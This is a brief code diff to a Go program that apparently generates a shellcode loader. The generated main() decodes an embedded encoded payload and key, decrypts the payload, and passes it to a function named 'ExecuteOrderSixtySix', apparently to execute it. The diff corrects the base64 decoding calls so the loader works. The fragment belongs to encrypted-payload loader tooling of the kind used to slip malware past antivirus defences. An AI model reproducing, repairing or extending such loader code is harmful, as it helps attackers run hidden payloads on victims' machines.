@@ -115,8 +115,8 @@ var Code = %s
 
 func main() {
 
-    decodedSc := enc.DecodeFromString(Code)
-    decodedKey := enc.DecodeFromString(Key)
+    decodedSc, _ := enc.StdEncoding.DecodeString(Code)
+    decodedKey, _ := enc.StdEncoding.DecodeString(Key)
 
     decrypted, err := Decrypt(decodedSc, decodedKey)
     if err != nil {
@@ -126,5 +126,4 @@ func main() {
     ExecuteOrderSixtySix(decrypted)
 }
     `, encoding, key, sc)
-
 }
